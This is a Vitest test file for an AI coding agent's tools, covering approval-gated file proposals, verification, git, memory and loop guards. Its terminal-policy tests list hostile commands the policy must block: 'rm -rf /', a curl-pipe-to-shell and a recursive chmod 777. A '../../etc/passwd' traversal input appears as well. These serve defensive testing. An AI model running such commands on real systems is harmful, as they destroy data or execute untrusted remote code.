import { beforeEach, describe, expect, it } from 'vitest';
import type { ServerEvent } from '@nova/shared';
import { ModelRouter } from '../apps/worker/src/ai/router.js';
import { GitService } from '../apps/worker/src/agent/git.js';
import { runAgent } from '../apps/worker/src/agent/loop.js';
import { applyChange } from '../apps/worker/src/agent/tools/files.js';
import { RuntimeSecrets } from '../apps/worker/src/env.js';
import { createLogger } from '../apps/worker/src/lib/log.js';
import { DisabledSandbox } from '../apps/worker/src/sandbox/disabled.js';
import { JsonStore } from '../apps/worker/src/storage/json-store.js';
import { TOOL_MAP } from '../apps/worker/src/agent/tools/index.js';
import { classifyCommand } from '../apps/worker/src/agent/permissions.js';
import type { ToolContext } from '../apps/worker/src/agent/tools/types.js';
import { ScriptedAdapter, testConfig, testModel } from './helpers.js';

const log = createLogger('test', 'error');

interface Harness {
  store: JsonStore;
  projectId: string;
  ctx: ToolContext;
  git: GitService;
  events: ServerEvent[];
}

async function makeHarness(opts: { autoApply?: boolean; allowTerminal?: boolean; files?: Record<string, string> } = {}): Promise<Harness> {
  const store = new JsonStore();
  await store.init();
  const project = await store.createProject({ name: 'demo', description: 'test project' });
  for (const [path, content] of Object.entries(opts.files ?? {})) await store.putFile(project.id, path, content);
  const git = new GitService(store);
  const events: ServerEvent[] = [];
  const ctx: ToolContext = {
    store,
    git,
    sandbox: new DisabledSandbox(),
    cfg: testConfig(),
    projectId: project.id,
    runId: 'run_test',
    autoApply: opts.autoApply ?? false,
    allowTerminal: opts.allowTerminal ?? false,
    log,
    emit: (e) => events.push(e),
    recordEvent: async () => undefined,
  };
  const harness = { store, projectId: project.id, ctx, git, events };
  ACTIVE = harness;
  return harness;
}

/** Tools always run against the most recently built harness (tests are sequential). */
let ACTIVE: Harness | null = null;

function call(name: string, args: Record<string, unknown>) {
  if (!ACTIVE) throw new Error('no harness — call makeHarness() first');
  const tool = TOOL_MAP.get(name);
  if (!tool) throw new Error(`unknown tool ${name}`);
  return tool.run(args, ACTIVE.ctx);
}

describe('tool registry', () => {
  it('exposes all seven required capability groups', () => {
    const names = [...TOOL_MAP.keys()];
    expect(names).toContain('read_file'); // File Reader
    expect(names).toContain('edit_file'); // File Editor
    expect(names).toContain('search_project'); // Project Search
    expect(names).toContain('git_commit'); // Git Integration
    expect(names).toContain('run_command'); // Terminal Integration
    expect(names).toContain('plan_tasks'); // Task Planner
    expect(names).toContain('verify_code'); // Code Verification
  });

  it('every tool declares a JSON schema with a description and a risk level', () => {
    for (const [name, tool] of TOOL_MAP) {
      expect(tool.descriptor.name).toBe(name);
      expect(tool.descriptor.description.length).toBeGreaterThan(20);
      expect(['read-only', 'proposal', 'needs-approval', 'destructive']).toContain(tool.descriptor.risk);
      expect(tool.descriptor.parameters).toMatchObject({ type: 'object' });
    }
  });
});

describe('file tools', () => {
  let h: Harness;
  beforeEach(async () => {
    h = await makeHarness({ files: { 'src/app.ts': 'export const a = 1;\nexport const a = 2;\n', 'README.md': '# Demo\n' } });
  });

  it('reads a file with 1-based line numbers', async () => {
    const res = await call('read_file', { path: 'src/app.ts' });
    expect(res.ok).toBe(true);
    expect(res.output).toContain('1| export const a = 1;');
    expect(res.meta?.totalLines).toBe(3);
  });

  it('reads a slice of a large file', async () => {
    const res = await call('read_file', { path: 'src/app.ts', startLine: 2, endLine: 2 });
    expect(res.output).toContain('export const a = 2;');
    expect(res.output).not.toContain('a = 1');
  });

  it('refuses path traversal and protected paths', async () => {
    expect((await call('read_file', { path: '../../etc/passwd' })).ok).toBe(false);
    const write = await call('write_file', { path: '.env', content: 'SECRET=1' });
    expect(write.ok).toBe(false);
    expect(write.output).toMatch(/protected/i);
  });

  it('write_file creates a PENDING proposal, not a real file', async () => {
    const res = await call('write_file', { path: 'src/new.ts', content: 'export const x = 1;\n', reason: 'test' });
    expect(res.ok).toBe(true);
    expect(res.output).toMatch(/PENDING USER APPROVAL/);
    expect(await h.store.getFile(h.projectId, 'src/new.ts')).toBeNull();
    const changes = await h.store.listChanges(h.projectId, 'pending');
    expect(changes).toHaveLength(1);
    expect(changes[0].kind).toBe('create');
    expect(h.events.some((e) => e.type === 'agent.change.proposed')).toBe(true);
  });

  it('read_file shows a pending proposal, clearly labelled', async () => {
    await call('write_file', { path: 'src/new.ts', content: 'export const x = 1;\n' });
    const res = await call('read_file', { path: 'src/new.ts' });
    expect(res.ok).toBe(true);
    expect(res.output).toMatch(/PENDING PROPOSAL/);
    expect(res.output).toContain('export const x = 1;');
  });

  it('approving a proposal is what actually writes the file', async () => {
    await call('write_file', { path: 'src/new.ts', content: 'export const x = 1;\n' });
    const change = (await h.store.listChanges(h.projectId, 'pending'))[0];
    await applyChange({ store: h.store, projectId: h.projectId }, change);
    const file = await h.store.getFile(h.projectId, 'src/new.ts');
    expect(file?.content).toBe('export const x = 1;\n');
    expect((await h.store.getChange(change.id))?.status).toBe('applied');
  });

  it('autoApply writes immediately and says so', async () => {
    const auto = await makeHarness({ autoApply: true });
    auto.ctx.autoApply = true;
    const tool = TOOL_MAP.get('write_file')!;
    const res = await tool.run({ path: 'a.ts', content: 'const a = 1;\n' }, auto.ctx);
    expect(res.output).toMatch(/AUTO-APPLIED/);
    expect(await auto.store.getFile(auto.projectId, 'a.ts')).not.toBeNull();
  });

  it('edit_file rejects an ambiguous search instead of guessing', async () => {
    const res = await call('edit_file', { path: 'src/app.ts', search: 'export const a', replace: 'X' });
    expect(res.ok).toBe(false);
    expect(res.output).toMatch(/ambiguous/i);
    // The error must be actionable: it lists where each occurrence is.
    expect(res.output).toMatch(/Occurrences → line 1.*line 2/);
  });

  it('edit_file applies a unique replacement as a proposal', async () => {
    const res = await call('edit_file', { path: 'src/app.ts', search: 'export const a = 2;', replace: 'export const a = 3;' });
    expect(res.ok).toBe(true);
    const change = (await h.store.listChanges(h.projectId, 'pending'))[0];
    expect(change.after).toContain('a = 3');
    expect(change.before).toContain('a = 2');
  });

  it('search_project finds content with line numbers', async () => {
    const res = await call('search_project', { query: 'export const a' });
    expect(res.ok).toBe(true);
    expect(res.output).toContain('src/app.ts:1');
    expect(res.meta?.hits).toBeGreaterThan(0);
  });

  it('list_files renders the tree', async () => {
    const res = await call('list_files', {});
    expect(res.output).toContain('src/app.ts');
    expect(res.output).toContain('README.md');
  });
});

describe('verification tool', () => {
  it('catches invalid JSON', async () => {
    const h = await makeHarness({ files: { 'config.json': '{ "a": 1,, }' } });
    const res = await call('verify_code', { path: 'config.json' });
    expect(res.meta?.pass).toBe(false);
    expect(res.output).toMatch(/invalid JSON/);
  });

  it('catches unbalanced brackets', async () => {
    const h = await makeHarness({ files: { 'a.js': 'function f() {\n  return 1;\n' } });
    const res = await call('verify_code', { path: 'a.js' });
    expect(res.meta?.pass).toBe(false);
    expect(res.output).toMatch(/unclosed/);
  });

  it('catches unresolved relative imports', async () => {
    const h = await makeHarness({ files: { 'a.ts': "import { x } from './missing';\nexport const y = x;\n" } });
    const res = await call('verify_code', { path: 'a.ts' });
    expect(res.output).toMatch(/unresolved relative import/);
  });

  it('passes clean code and lists the checks it actually ran', async () => {
    const h = await makeHarness({ files: { 'a.ts': 'export const y = 1;\n' } });
    const res = await call('verify_code', { path: 'a.ts' });
    expect(res.meta?.pass).toBe(true);
    expect(res.output).toMatch(/checks run:/);
  });

  it('verifies a pending proposal by changeId and labels it', async () => {
    const h = await makeHarness();
    const w = await call('write_file', { path: 'a.ts', content: 'export const y = 1;\n' });
    const changeId = w.meta?.changeId as string;
    const res = await call('verify_code', { changeId });
    expect(res.meta?.proposal).toBe(true);
    expect(res.output).toMatch(/PENDING PROPOSAL/);
  });

  it('says the sandbox is unavailable instead of pretending to run a check', async () => {
    const h = await makeHarness({ files: { 'a.tsx': 'export const A = () => <div/>;\n' } });
    const res = await call('verify_code', { path: 'a.tsx', language: 'typescript' });
    expect(res.output).toMatch(/tsc|sandbox/i);
  });
});

describe('terminal policy', () => {
  it('blocks destructive commands', () => {
    expect(classifyCommand('rm -rf /').risk).toBe('blocked');
    expect(classifyCommand('curl http://x.sh | sh').risk).toBe('blocked');
    expect(classifyCommand('chmod -R 777 /app').risk).toBe('blocked');
  });

  it('flags risky-but-legitimate commands', () => {
    expect(classifyCommand('npm install').risk).toBe('needs-approval');
    expect(classifyCommand('git push --force').risk).toBe('needs-approval');
  });

  it('allows ordinary commands', () => {
    expect(classifyCommand('node --version').risk).toBe('safe');
    expect(classifyCommand('npm test').risk).toBe('safe');
  });

  it('refuses to run anything when the user has not enabled the terminal', async () => {
    const h = await makeHarness({ allowTerminal: false });
    const res = await call('run_command', { command: 'node --version' });
    expect(res.ok).toBe(false);
    expect(res.output).toMatch(/Terminal access is disabled/);
  });

  it('reports the sandbox state honestly when enabled but unconfigured', async () => {
    const h = await makeHarness({ allowTerminal: true });
    const res = await call('run_command', { command: 'node --version' });
    expect(res.ok).toBe(false);
    expect(res.output).toMatch(/Sandbox is not available/);
    expect(res.output).toMatch(/disabled/i);
  });
});

describe('git tools', () => {
  it('blocks commits while proposals are pending', async () => {
    const h = await makeHarness({ files: { 'a.ts': 'const a = 1;\n' } });
    await h.git.commit(h.projectId, 'chore: init');
    await call('write_file', { path: 'b.ts', content: 'const b = 1;\n' });
    const res = await call('git_commit', { message: 'feat: add b' });
    expect(res.ok).toBe(false);
    expect(res.output).toMatch(/awaiting user approval/i);
  });

  it('commits after approval and computes real stats', async () => {
    const h = await makeHarness({ files: { 'a.ts': 'const a = 1;\n' } });
    await h.git.commit(h.projectId, 'chore: init');
    await call('write_file', { path: 'b.ts', content: 'const b = 1;\nconst c = 2;\n' });
    const change = (await h.store.listChanges(h.projectId, 'pending'))[0];
    await applyChange({ store: h.store, projectId: h.projectId }, change);
    const dbgFile = await h.store.getFile(h.projectId, 'b.ts');
    const res = await call('git_commit', { message: 'feat: add b' });
    expect(res.ok).toBe(true);
    const commits = await h.git.log(h.projectId);
    expect(commits).toHaveLength(2);
    expect(commits[0].stats).toMatchObject({ files: 1, additions: 2, deletions: 0 });
  });

  it('reports working tree status', async () => {
    const h = await makeHarness({ files: { 'a.ts': 'const a = 1;\n' } });
    await h.git.commit(h.projectId, 'chore: init');
    await h.store.putFile(h.projectId, 'a.ts', 'const a = 2;\n');
    const res = await call('git_status', {});
    expect(res.output).toMatch(/M a\.ts/);
    expect(res.output).toMatch(/branch: main/);
  });

  it('shows a unified diff for a path', async () => {
    const h = await makeHarness({ files: { 'a.ts': 'const a = 1;\n' } });
    await h.git.commit(h.projectId, 'chore: init');
    await h.store.putFile(h.projectId, 'a.ts', 'const a = 2;\n');
    const res = await call('git_diff', { path: 'a.ts' });
    expect(res.output).toContain('-const a = 1;');
    expect(res.output).toContain('+const a = 2;');
  });
});

describe('planning + memory tools', () => {
  it('persists a plan and updates statuses', async () => {
    const h = await makeHarness();
    const plan = await call('plan_tasks', { tasks: [{ title: 'Step one', detail: 'do it' }, { title: 'Step two' }] });
    expect(plan.ok).toBe(true);
    const tasks = await h.store.listTasks({ projectId: h.projectId });
    expect(tasks).toHaveLength(2);
    expect(tasks[0].order).toBe(1);
    const id = (plan.meta?.taskIds as string[])[0];
    await call('update_task', { taskId: id, status: 'done' });
    expect((await h.store.listTasks({ projectId: h.projectId }))[0].status).toBe('done');
  });

  it('keeps project memory separate from global memory', async () => {
    const h = await makeHarness();
    await call('write_memory', { key: 'test-command', content: 'npm test', scope: 'project' });
    await call('write_memory', { key: 'language', content: 'Arabic', scope: 'global' });
    expect(await h.store.listMemory('project', h.projectId)).toHaveLength(1);
    expect(await h.store.listMemory('global', null)).toHaveLength(1);
    const res = await call('read_memory', {});
    expect(res.output).toMatch(/project memory \(1\)/);
    expect(res.output).toMatch(/global memory \(1\)/);
  });
});

describe('agent loop', () => {
  function routerFor(steps: Parameters<typeof ScriptedAdapter.prototype.complete> extends never ? never : ConstructorParameters<typeof ScriptedAdapter>[0]) {
    const adapter = new ScriptedAdapter(steps, [testModel()]);
    const store = new JsonStore();
    const router = new ModelRouter({} as never, testConfig(), store, new RuntimeSecrets(), log, [adapter]);
    return { adapter, store, router };
  }

  it('plans, proposes a file, verifies it, and ends awaiting approval', async () => {
    const { adapter, router } = routerFor([
      { toolCalls: [{ id: 'c1', name: 'plan_tasks', arguments: { tasks: [{ title: 'Create greeting module' }] } }] },
      { toolCalls: [{ id: 'c2', name: 'write_file', arguments: { path: 'src/greet.ts', content: 'export const greet = (n: string) => `hi ${n}`;\n', reason: 'implement greeting' } }] },
      { toolCalls: [{ id: 'c3', name: 'verify_code', arguments: { path: 'src/greet.ts' } }] },
      { text: 'I proposed src/greet.ts. It is waiting for your approval.' },
    ]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'loop-demo' });
    const events: ServerEvent[] = [];
    const outcome = await runAgent(
      { store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log },
      { projectId: project.id, prompt: 'Create a greeting module', maxSteps: 6 },
      (e) => events.push(e),
    );

    expect(outcome.status).toBe('awaiting_approval');
    expect(outcome.steps).toBe(4);
    expect(outcome.toolCalls).toBe(3);
    expect(outcome.proposedChanges).toHaveLength(1);
    expect(await store.getFile(project.id, 'src/greet.ts')).toBeNull(); // NOT applied
    expect((await store.listChanges(project.id, 'pending'))[0].path).toBe('src/greet.ts');
    expect((await store.listTasks({ projectId: project.id }))).toHaveLength(1);

    const types = events.map((e) => e.type);
    expect(types).toContain('agent.start');
    expect(types).toContain('agent.tool.start');
    expect(types).toContain('agent.tool.result');
    expect(types).toContain('agent.change.proposed');
    expect(types).toContain('agent.await.approval');
    expect(types).toContain('agent.done');

    // The model saw the real tool output, including the approval requirement.
    const toolTurns = adapter.calls.at(-1)!.messages.filter((m) => m.role === 'tool');
    expect(toolTurns.some((m) => m.content.includes('PENDING USER APPROVAL'))).toBe(true);
    expect(toolTurns.some((m) => m.content.includes('verify_code'))).toBe(true);
  });

  it('applies changes directly when the user opted into autoApply', async () => {
    const { router } = routerFor([
      { toolCalls: [{ id: 'c1', name: 'write_file', arguments: { path: 'a.ts', content: 'const a = 1;\n' } }] },
      { text: 'Done.' },
    ]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'auto' });
    const outcome = await runAgent(
      { store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log },
      { projectId: project.id, prompt: 'create a.ts', autoApply: true },
      () => undefined,
    );
    expect(outcome.status).toBe('completed');
    expect(await store.getFile(project.id, 'a.ts')).not.toBeNull();
  });

  it('stops a model that repeats the same call (loop guard)', async () => {
    const same = { toolCalls: [{ id: 'cX', name: 'read_file', arguments: { path: 'missing.ts' } }] };
    const { router } = routerFor([same, same, same, same, same, same]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'looping' });
    const events: ServerEvent[] = [];
    const outcome = await runAgent(
      { store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log },
      { projectId: project.id, prompt: 'read it', maxSteps: 10 },
      (e) => events.push(e),
    );
    expect(outcome.status).toBe('failed');
    expect(outcome.summary).toMatch(/loop guard|repeated/i);
  });

  it('respects the step limit and says so', async () => {
    const step = { toolCalls: [{ id: 'c', name: 'list_files', arguments: {} }] };
    const { router } = routerFor([step]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'steps' });
    const outcome = await runAgent(
      { store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log },
      { projectId: project.id, prompt: 'go', maxSteps: 2 },
      () => undefined,
    );
    expect(outcome.steps).toBe(2);
    expect(outcome.summary).toMatch(/Step limit reached/);
  });

  it('surfaces unknown tools as an error the model can recover from', async () => {
    const { router } = routerFor([
      { toolCalls: [{ id: 'c1', name: 'deploy_to_mars', arguments: {} }] },
      { text: 'Sorry, that tool does not exist.' },
    ]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'unknown-tool' });
    const events: ServerEvent[] = [];
    await runAgent({ store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log }, { projectId: project.id, prompt: 'x' }, (e) => events.push(e));
    const result = events.find((e) => e.type === 'agent.tool.result') as Extract<ServerEvent, { type: 'agent.tool.result' }>;
    expect(result.ok).toBe(false);
    expect(result.output).toMatch(/unknown tool/);
  });

  it('tells the model when the terminal is disabled instead of faking output', async () => {
    const { router, adapter } = routerFor([
      { toolCalls: [{ id: 'c1', name: 'run_command', arguments: { command: 'npm test' } }] },
      { text: 'I could not run tests.' },
    ]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'terminal-off' });
    await runAgent({ store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log }, { projectId: project.id, prompt: 'run the tests' }, () => undefined);
    const toolMsg = adapter.calls.at(-1)!.messages.find((m) => m.role === 'tool');
    expect(toolMsg?.content).toMatch(/Terminal access is disabled/);
  });

  it('system prompt carries the real project tree, sandbox state and approval rules', async () => {
    const { router, adapter } = routerFor([{ text: 'ok' }]);
    const store = new JsonStore();
    await store.init();
    const project = await store.createProject({ name: 'prompted' });
    await store.putFile(project.id, 'src/index.ts', 'export {};\n');
    await runAgent({ store, router, sandbox: new DisabledSandbox(), cfg: testConfig(), log }, { projectId: project.id, prompt: 'hi' }, () => undefined);
    const system = adapter.calls[0].messages[0];
    expect(system.role).toBe('system');
    expect(system.content).toContain('src/index.ts');
    expect(system.content).toContain('SANDBOX: disabled — NOT CONFIGURED');
    expect(system.content).toMatch(/CHANGE PROPOSALS/);
    expect(system.content).toMatch(/Never invent/);
  });
});
